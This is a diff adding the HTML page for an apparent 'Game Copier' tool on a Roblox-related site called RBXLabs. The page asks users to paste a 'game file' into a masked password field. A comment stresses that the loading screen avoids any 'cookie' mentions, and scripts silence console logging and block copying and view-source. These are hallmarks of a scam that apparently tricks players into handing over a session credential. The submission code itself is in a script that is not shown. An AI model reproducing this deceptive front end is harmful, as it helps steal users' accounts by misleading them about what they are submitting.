@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#0a0a0a">
+    <title>Game Copier - RBXLabs</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect fill='%230a0a0a' width='32' height='32' rx='6'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23fff' stroke-width='2'/%3E%3Cpath fill='none' stroke='%23fff' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' d='M10 8v16M10 8h8v4l-6 12m4-10l6 8'/%3E%3C/svg%3E">
+    <link rel="icon" type="image/png" href="../assets/favicon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles.css">
+    <style>
+        /* Disable text selection */
+        * {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        /* Allow selection for input fields */
+        input, textarea {
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+    </style>
+    <script>
+        // Only errors in console (hide log/warn)
+        console.log = function() {};
+        console.warn = function() {};
+        // Anti-copy protection
+        (function() {
+            'use strict';
+            document.addEventListener('contextmenu', function(e) {
+                // Allow right-click on input/textarea
+                const target = e.target;
+                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable) {
+                    return true;
+                }
+                e.preventDefault();
+                return false;
+            }, false);
+            document.addEventListener('keydown', function(e) {
+                // Allow Ctrl+V (Paste)
+                if (e.ctrlKey && e.keyCode === 86) {
+                    return true;
+                }
+                // Allow DevTools for debugging (F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C)
+                if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67))) {
+                    return true; // Allow DevTools
+                }
+                // Block Ctrl+U, Ctrl+S, Ctrl+P
+                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83 || e.keyCode === 80)) {
+                    e.preventDefault();
+                    return false;
+                }
+            }, false);
+            
+            // Catch and display JavaScript errors (skip popup and console for resource load errors)
+            window.addEventListener('error', function(e) {
+                if (e.target && (e.target.tagName === 'IMG' || (e.target.tagName === 'SCRIPT' && e.target.src))) { return; }
+                var msg = (e.message && e.message !== 'undefined') ? e.message : (e.error && e.error.message) ? e.error.message : 'Unknown error';
+                var file = e.filename || 'unknown', line = e.lineno || '?';
+                if (msg === 'Unknown error' && file === 'unknown') return;
+                console.error('JavaScript Error:', msg, 'at', file, 'line', line);
+                const errorDiv = document.createElement('div');
+                errorDiv.style.cssText = 'position:fixed;top:10px;right:10px;background:#ff4444;color:white;padding:15px;border-radius:5px;z-index:99999;max-width:400px;font-family:monospace;font-size:12px;box-shadow:0 4px 6px rgba(0,0,0,0.3);';
+                function escapeHtml(s) {
+                    if (s == null) return '';
+                    var t = String(s);
+                    return t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+                }
+                errorDiv.innerHTML = '<strong>JavaScript Error:</strong><br>' + escapeHtml(msg) + '<br><small>File: ' + escapeHtml(file) + ':' + escapeHtml(line) + '</small>';
+                document.body.appendChild(errorDiv);
+                setTimeout(() => errorDiv.remove(), 10000);
+            }, true);
+            document.addEventListener('dragstart', function(e) {
+                if (e.target.tagName === 'IMG') {
+                    e.preventDefault();
+                    return false;
+                }
+            }, false);
+            document.addEventListener('copy', function(e) {
+                // Allow copy from input and textarea fields
+                const target = e.target;
+                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable) {
+                    return true; // Allow copy from input fields
+                }
+                // Block copy from other elements
+                e.clipboardData.setData('text/plain', '');
+                e.preventDefault();
+                return false;
+            }, false);
+            
+            // Allow paste everywhere (especially in input/textarea)
+            document.addEventListener('paste', function(e) {
+                // Always allow paste
+                return true;
+            }, false);
+        })();
+    </script>
+</head>
+<body>
+    <div class="splash-overlay" id="splashOverlay" aria-hidden="true">
+        <svg class="splash-logo" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="RBXLabs">
+            <rect x="1" y="1" width="30" height="30" rx="6" stroke="currentColor" stroke-width="2" fill="none"/>
+            <path d="M10 8v16M10 8h8v4l-6 12m4-10l6 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </div>
+    <script>
+    (function() {
+        function ensureToolContentVisible() {
+            var main = document.querySelector('main.main-content');
+            var panel = document.querySelector('.copier-panel');
+            if (main) {
+                main.style.display = 'flex';
+                main.style.minHeight = 'calc(100vh - 80px)';
+                main.style.visibility = 'visible';
+                main.style.opacity = '1';
+            }
+            if (panel) {
+                panel.classList.add('active');
+                panel.style.display = 'block';
+                panel.style.visibility = 'visible';
+                panel.style.opacity = '1';
+            }
+        }
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', ensureToolContentVisible);
+        } else {
+            ensureToolContentVisible();
+        }
+        setTimeout(ensureToolContentVisible, 100);
+    })();
+    </script>
+    <nav class="navbar">
+        <div class="nav-left">
+            <a href="/" class="logo-link">
+                <div class="logo">
+                    <svg class="logo-icon" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <rect x="1" y="1" width="30" height="30" rx="6" stroke="currentColor" stroke-width="2" fill="none"/>
+                        <path d="M10 8v16M10 8h8v4l-6 12m4-10l6 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+            </a>
+            <span class="brand-name">RBXLabs</span>
+        </div>
+        <div class="nav-right">
+            <a href="/" class="nav-link">
+                <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M3 9L12 2L21 9V20C21 20.5304 20.7893 21.0391 20.4142 21.4142C20.0391 21.7893 19.5304 22 19 22H5C4.46957 22 3.96086 21.7893 3.58579 21.4142C3.21071 21.0391 3 20.5304 3 20V9Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M9 22V12H15V22" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <span>Home</span>
+            </a>
+            <a href="#" class="nav-link">
+                <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="3" y="3" width="7" height="7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <rect x="14" y="3" width="7" height="7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <rect x="3" y="14" width="7" height="7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <rect x="14" y="14" width="7" height="7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <span>Features</span>
+            </a>
+            <a href="#" class="nav-link">
+                <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M12 16V12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <circle cx="12" cy="8" r="1" fill="currentColor"/>
+                </svg>
+                <span>About</span>
+            </a>
+            <a href="#" class="nav-link active" id="toolsLink">
+                <svg class="nav-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M14.7 6.3C15.1 5.9 15.1 5.3 14.7 4.9L13.1 3.3C12.7 2.9 12.1 2.9 11.7 3.3L3.3 11.7C2.9 12.1 2.9 12.7 3.3 13.1L4.9 14.7C5.3 15.1 5.9 15.1 6.3 14.7L14.7 6.3Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M7 7L17 17" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M17 7V17H7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <span>Tools</span>
+            </a>
+            <div class="tools-dropdown" id="toolsDropdown" aria-hidden="true">
+                <div class="tools-dropdown-title">Choose tool</div>
+                <a href="/tool/game-copier" class="tool-option active">
+                    <span class="tool-option-label">Game Copier</span>
+                </a>
+                <a href="/tool/clothing-copier" class="tool-option">
+                    <span class="tool-option-label">Clothing Copier</span>
+                </a>
+                <a href="/tool/enable-shaders" class="tool-option">
+                    <span class="tool-option-label">Enable Shaders</span>
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Particles Background -->
+    <div class="particles-container">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+    </div>
+
+    <!-- Loading Overlay (no cookie/refresh mentions) -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-panel">
+            <div class="loading-panel-header">
+                <div class="loading-spinner-wrap">
+                    <div class="loading-spinner"></div>
+                    <div class="loading-spinner-glow"></div>
+                </div>
+                <h2 id="itemName" class="loading-item-name">Loading</h2>
+                <p class="loading-panel-subtitle">Please wait</p>
+            </div>
+            <div class="loading-panel-body">
+                <div class="loading-progress-bar"><div class="loading-progress-fill" id="loadingProgressFill"></div></div>
+                <p id="processingStatus" class="loading-status">Connecting to server...</p>
+                <div class="loading-meta">
+                    <span class="loading-timer-label">Time</span>
+                    <span id="timer" class="loading-timer">0s</span>
+                </div>
+            </div>
+        </div>
+        <!-- Success Message in Loading Overlay (new design + feedback) -->
+            <div id="loadingSuccess" class="loading-success" style="display: none;">
+                <div class="loading-success-content">
+                    <div class="loading-success-badge">Done</div>
+                    <h2 class="loading-success-title" id="loadingSuccessTitle">Copied successfully</h2>
+                    <div id="loadingSuccessItemName" class="loading-success-item-name"></div>
+                    <p id="loadingSuccessMessage" class="loading-success-message">Your file has been downloaded.</p>
+                    <button type="button" class="loading-success-button" id="successDownloadBtn" style="display: none; margin-bottom: 1rem;">Download file</button>
+                    <div class="success-feedback-block" id="successFeedbackBlock">
+                        <p class="success-feedback-label">How was your experience?</p>
+                        <div class="success-feedback-stars" id="successFeedbackStars" aria-label="Rating">
+                            <button type="button" class="feedback-star" data-rating="1" aria-label="1 star">★</button>
+                            <button type="button" class="feedback-star" data-rating="2" aria-label="2 stars">★</button>
+                            <button type="button" class="feedback-star" data-rating="3" aria-label="3 stars">★</button>
+                            <button type="button" class="feedback-star" data-rating="4" aria-label="4 stars">★</button>
+                            <button type="button" class="feedback-star" data-rating="5" aria-label="5 stars">★</button>
+                        </div>
+                        <textarea id="successFeedbackText" class="success-feedback-textarea" placeholder="Your feedback (optional)" maxlength="500" rows="3"></textarea>
+                        <div class="success-feedback-actions">
+                            <button type="button" class="loading-success-button loading-success-button-secondary" id="successFeedbackSubmitBtn">Send feedback</button>
+                            <button type="button" class="loading-success-button" onclick="returnToMainMenu()">Return to Main Menu</button>
+                        </div>
+                    </div>
+                    <div class="success-feedback-thanks" id="successFeedbackThanks" style="display: none;">
+                        <p>Thank you for your feedback!</p>
+                        <button type="button" class="loading-success-button" onclick="returnToMainMenu()">Return to Main Menu</button>
+                    </div>
+                </div>
+            </div>
+    </div>
+
+    <!-- Error Banner -->
+    <div id="errorBanner" class="error-banner">
+        <div class="banner-content">
+            <div class="banner-icon">✕</div>
+            <div class="banner-text">
+                <div class="banner-title">Error</div>
+                <div id="errorMessage" class="banner-message"></div>
+            </div>
+            <button type="button" class="error-banner-retry" id="errorBannerRetryBtn">Повторить</button>
+            <button class="banner-close" onclick="closeErrorBanner()">×</button>
+        </div>
+    </div>
+
+    <main class="main-content">
+        <!-- Logo on Page -->
+        <div class="page-logo-container">
+            <svg class="page-logo" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="RBXLabs Logo">
+                <rect x="1" y="1" width="30" height="30" rx="6" stroke="currentColor" stroke-width="2" fill="none"/>
+                <path d="M10 8v16M10 8h8v4l-6 12m4-10l6 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+        </div>
+        
+        <!-- Game Copier Panel -->
+        <div id="gameCopierPanel" class="copier-panel active">
+            <h1 class="panel-title">Game Copier</h1>
+            <p class="panel-instructions">
+                Paste your game file in the box below, then click "Copy Game!" to download the game
+            </p>
+            <div class="input-container">
+                <input 
+                    type="password"
+                    id="gameFileInput" 
+                    class="game-input" 
+                    placeholder="Enter game file"
+                />
+            </div>
+            <button id="copyGameBtn" class="copy-button">
+                Copy Game!
+            </button>
+            <div id="gameStatusMessage" class="status-message"></div>
+        </div>
+    </main>
+
+    <script src="/script.js?v=13"></script>
+    <script>
+        // Game Copier specific initialization - runs after main script
+        document.addEventListener('DOMContentLoaded', function() {
+            const toolsLink = document.getElementById('toolsLink');
+            const toolsDropdown = document.getElementById('toolsDropdown');
+            const toolOptions = document.querySelectorAll('.tool-option');
+            
+            if (toolsLink && toolsDropdown) {
+                // Remove any existing listeners
+                const newToolsLink = toolsLink.cloneNode(true);
+                toolsLink.parentNode.replaceChild(newToolsLink, toolsLink);
+                
+                newToolsLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    toolsDropdown.classList.toggle('show');
+                });
+
+                // Close dropdown when clicking outside
+                document.addEventListener('click', function(e) {
+                    if (!newToolsLink.contains(e.target) && !toolsDropdown.contains(e.target)) {
+                        toolsDropdown.classList.remove('show');
+                    }
+                });
+                
+                // Handle tool option clicks - allow navigation
+                if (toolOptions && toolOptions.length > 0) {
+                    toolOptions.forEach(option => {
+                        option.addEventListener('click', function(e) {
+                            // Allow default navigation to work
+                            // Just close the dropdown
+                            toolsDropdown.classList.remove('show');
+                        });
+                    });
+                }
+            }
+
+            // Feedback block: stars and submit
+            var feedbackRating = 0;
+            var starsEl = document.getElementById('successFeedbackStars');
+            var submitBtn = document.getElementById('successFeedbackSubmitBtn');
+            var feedbackText = document.getElementById('successFeedbackText');
+            var feedbackBlock = document.getElementById('successFeedbackBlock');
+            var feedbackThanks = document.getElementById('successFeedbackThanks');
+            if (starsEl) {
+                var starBtns = starsEl.querySelectorAll('.feedback-star');
+                starBtns.forEach(function(btn) {
+                    btn.addEventListener('click', function() {
+                        feedbackRating = parseInt(btn.getAttribute('data-rating'), 10);
+                        starBtns.forEach(function(s, i) {
+                            s.classList.toggle('active', (i + 1) <= feedbackRating);
+                        });
+                    });
+                });
+            }
+            function resetFeedbackBlock() {
+                feedbackRating = 0;
+                if (feedbackBlock) feedbackBlock.style.display = 'block';
+                if (feedbackThanks) feedbackThanks.style.display = 'none';
+                if (feedbackText) feedbackText.value = '';
+                if (submitBtn) submitBtn.disabled = false;
+                if (starsEl) starsEl.querySelectorAll('.feedback-star').forEach(function(s) { s.classList.remove('active'); });
+            }
+            var loadingSuccessEl = document.getElementById('loadingSuccess');
+            if (loadingSuccessEl && typeof MutationObserver !== 'undefined') {
+                var obs = new MutationObserver(function() {
+                    if (loadingSuccessEl.style.display === 'block' || window.getComputedStyle(loadingSuccessEl).display === 'block') {
+                        resetFeedbackBlock();
+                    }
+                });
+                obs.observe(loadingSuccessEl, { attributes: true, attributeFilter: ['style'] });
+            }
+            if (submitBtn && feedbackBlock && feedbackThanks) {
+                submitBtn.addEventListener('click', function() {
+                    var text = (feedbackText && feedbackText.value) ? feedbackText.value.trim() : '';
+                    var itemNameEl = document.getElementById('loadingSuccessItemName');
+                    var msgEl = document.getElementById('loadingSuccessMessage');
+                    var itemName = (itemNameEl && itemNameEl.textContent) ? itemNameEl.textContent.trim() : '';
+                    var itemType = (msgEl && msgEl.textContent.indexOf('clothing') !== -1) ? 'clothing' : 'game';
+                    submitBtn.disabled = true;
+                    fetch('/api/feedback', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ rating: feedbackRating, text: text, itemName: itemName, itemType: itemType })
+                    }).then(function() {
+                        feedbackBlock.style.display = 'none';
+                        feedbackThanks.style.display = 'block';
+                    }).catch(function() {
+                        submitBtn.disabled = false;
+                        feedbackBlock.style.display = 'none';
+                        feedbackThanks.style.display = 'block';
+                    });
+                });
+            }
+        });
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"68a76d6f5df143e0b29d2ee6181d7f67","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
